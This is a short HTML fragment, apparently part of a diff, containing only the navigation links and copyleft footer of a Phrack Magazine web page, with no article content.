+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
